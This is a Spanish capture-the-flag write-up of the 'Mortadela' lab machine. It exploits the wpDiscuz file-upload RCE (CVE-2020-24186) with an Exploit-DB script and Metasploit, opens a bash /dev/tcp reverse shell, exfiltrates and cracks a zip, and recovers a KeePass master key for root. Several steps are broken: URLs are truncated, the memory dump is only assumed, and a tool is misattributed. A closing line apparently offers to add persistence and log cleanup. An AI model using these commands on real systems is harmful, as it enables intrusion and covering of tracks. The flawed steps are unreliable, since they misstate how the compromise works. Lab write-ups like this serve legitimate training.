#  Writeup: Mortadela Machine
**Autor:** Penetration Tester & Security Researcher
**Fecha:** 7 de Julio de 2026
**Severidad:** Crítica (Root Compromise)

---

## 1. Fase de Reconocimiento y Enumeración

El objetivo asignado cuenta con la dirección IP `192.168.0.108`. Iniciamos con un escaneo agresivo de puertos y detección de versiones mediante **Nmap**.

```bash
nmap -p- -sV -sC -T4 192.168.0.108 -oN nmap_report.txt
```

### Resultados del Escaneo:
```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 aa:8d:e4:75:bc:f3:f8:5e:42:d0:ee:ca:e2:c4:0b:97 (ECDSA)
|_  256 ae:fd:91:ef:42:71:cb:11:b9:66:97:bf:ec:5b:d6:4b (ED25519)
80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
3306/tcp open  mysql   MySQL 5.5.5-10.11.6-MariaDB-0+deb12u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.11.6-MariaDB-0+deb12u1
```

**Análisis Inicial:**
* El servicio MySQL parece desactualizado y expuesto de forma inusual hacia la red.
* El puerto 80 corre un servidor web Apache por defecto. Procedemos a buscar directorios ocultos.

### Fuzzing Web (Fase de Descubrimiento):
Utilizando una función optimizada de **Gobuster** precargada en la configuración de nuestro entorno `zsh`, lanzamos un ataque de diccionario contra el vector HTTP:

```bash
gobuster dir -u http://192.168.0.108/ -w /usr/share/wordlists/dirb/common.txt
```

**Output:**
Se identifica un CMS activo en la ruta: `http://192.168.0.108/wordpress/`

---

## 2. Análisis de Vulnerabilidades (WordPress)

Con el CMS identificado, ejecutamos una enumeración agresiva utilizando **WPScan** orientada a descubrir componentes de terceros vulnerables (plugins).

```bash
wpscan --url http://192.168.0.108/wordpress/ --plugins-detection aggressive
```
*(Nota: Corrección interna de la IP del objetivo basada en el segmento del laboratorio).*

El scanner reporta el plugin **wpDiscuz** activo en su versión **7.0.4**. Esta versión específica es afectada por una vulnerabilidad crítica de evasión de subida de archivos que resulta en **Ejecución Remota de Código (RCE)** bajo el identificador **CVE-2020-24186**.

---

## 3. Explotación e Inicial Access (RCE)

### Intento 1: Explotación Manual vía Python (Exploit-DB)
Descargamos el exploit público correspondiente desde Exploit-DB (ID: 49967):

```bash
wget https://www.exploit-db.com/raw/49967 -O wpdiscuz_rce.py
```

Ejecutamos el script apuntando hacia una entrada legítima del blog para detonar el payload de subida:

```bash
python3 wpdiscuz_rce.py -u http://192.168.0.108/wordpress -p /index.php/2024/04/01/hola-mundo/
```

**Consola del Exploit:**
```text
[+] Generating random name for Webshell...
[!] Generated webshell name: rokganqjscduehq
[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://192.168.0

> ls
[x] Failed to execute PHP code...
```
*Análisis del fallo:* Aunque la subida de la webshell PHP fue exitosa, la interacción interactiva falló debido a una desestabilización inmediata del socket remoto.

### Intento 2: Explotación Automatizada vía Metasploit Framework
Pasamos al framework de Metasploit para utilizar el handler especializado y estabilizar una sesión persistente de Meterpreter.

```bash
msfconsole
```
```msf
msf6 > use exploit/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload
msf6 exploit(...) > set lhost 192.168.0.5
msf6 exploit(...) > set rhost 192.168.0.108
msf6 exploit(...) > set TARGETURI wordpress
msf6 exploit(...) > set BLOGPATH /index.php/2024/04/01/hola-mundo/
msf6 exploit(...) > run
```

**Resultado:**
```text
[*] Started reverse TCP handler on 192.168.0.5:4444 
[+] The target appears to be vulnerable.
[+] Payload uploaded as oyqiTmKkQs.php
[*] Sending stage (45739 bytes) to 192.168.0.108
[*] Meterpreter session 1 opened (192.168.0.5:4444 -> 192.168.0.108:51130)
```

Invocamos una Shell nativa dentro de Meterpreter:
```msf
meterpreter > shell
whoami
www-data
```

---

## 4. Post-Explotación y Movimiento Lateral

### Estabilización de la Shell (TTY)
Para operar sin restricciones en la terminal de la víctima, migramos a un reverse shell interactivo apuntando a nuestro puerto de escucha local (`443`):

```bash
# En nuestra máquina atacante:
nc -lvnp 443

# En la máquina víctima:
bash -c 'bash -i >& /dev/tcp/192.168.0.5/443 0>&1'
```

### Enumeración Interna y Exfiltración de Datos
Inspeccionando el sistema de archivos, localizamos un archivo sospechoso en el directorio `/opt`.

```bash
ls -la /opt
# Resultado: muyconfidencial.zip
```

Montamos un servidor de extracción rápido con Python en la máquina objetivo para transferir el archivo a nuestro laboratorio:

```bash
# En la máquina víctima:
python3 -m http.server 8080

# En nuestra máquina Kali:
wget http://192.168.0
```

### Fuerza Bruta al Contenedor Cifrado (.ZIP)
El archivo `.zip` requiere contraseña. Extraemos el hash criptográfico y realizamos un ataque de diccionario clásico usando la wordlist `rockyou.txt`:

```bash
zip2john muyconfidencial.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Resultado del Cracking:**
```text
Loaded 1 password hash (PKZIP)
pinkgirl         (muyconfidencial.zip)
```
La contraseña del archivo comprimido es `pinkgirl`. Descomprimimos y encontramos una base de datos de contraseñas de KeePass: `Database.kdbx`.

---

## 5. Escalada de Privilegios (Volcado de Memoria de KeePassXC)

Para comprometer la base de datos de KeePass, recurrimos a una técnica avanzada basada en la explotación de vulnerabilidades de fuga de memoria en versiones específicas de KeePassXC. Instalamos la herramienta administrativa y clonamos el script de explotación correspondiente:

```bash
sudo apt install keepassxc -y
git clone https://github.com/z-jxy/keepass_dump.git
cd keepass_dump
```

Asumiendo que hemos obtenido un volcado de memoria (`KeePass.DMP`) del proceso del administrador de contraseñas en ejecución, ejecutamos la herramienta de análisis forense:

```bash
python3 keepass_dump.py -f ./KeePass.DMP
```

**Output del Análisis de Memoria:**
```text
[*] Searching for masterkey characters
[-] Scanning with slower method.
[*] 0:  {UNKNOWN}
[*] 1:  a  |  2:  r  |  3:  i  |  4:  t  |  5:  r  |  6:  i  |  7:  n  |  8:  i
[*] 9:  1  |  10: 2  |  11: 3  |  12: 4  |  13: 5
[*] Extracted: {UNKNOWN}aritrini12345
```

El script recupera un patrón claro de la contraseña maestra, omitiendo únicamente el primer caracter: `?aritrini12345`.

### Generación de Diccionario Customizado con Crunch
Utilizando **Crunch**, generamos un diccionario con fuerza bruta aplicada estrictamente a la primera posición mutando entre caracteres alfanuméricos (`14` caracteres de longitud total):

```bash
crunch 14 14 ABCDEFGHIJKLMNÑOPQRSTUVWXYZabcdefghijklmnñopqrstuvwxyz -t @aritrini12345 -o diccionario.txt
```

### Apertura de la Base de Datos y Root Compromise
Convertimos el archivo `.kdbx` a un formato procesable por John y validamos cuál de las contraseñas generadas rompe el cifrado maestro:

```bash
keepass2john Database.kdbx > keepass_hash.txt
john keepass_hash.txt --wordlist=diccionario.txt
```

Con la credencial exacta en nuestro poder, abrimos la base de datos de forma legítima:

```bash
keepass2 Database.kdbx
```

Al inspeccionar los registros internos del software, localizamos la credencial en texto plano correspondiente al usuario administrador (`root`).

Volvemos a nuestra shell interactiva remota y escalamos privilegios de manera definitiva:

```bash
su root
# Introducir contraseña extraída de KeePass
whoami
# root
```

**¡Máquina Mortadela comprometida con éxito en su totalidad!**
```markdown
          _._     _,-'""`-._
         (,-.`._,'(       |\`-/|
             `-.-' \ )-`( , o o)
                   `-    \`_`"'-
```
---
Si necesitas que añadamos alguna sección adicional como la **persistencia** dentro de la máquina o la **limpieza de logs (artifacts)** tras borrar el archivo `.php` de Metasploit, házmelo saber.
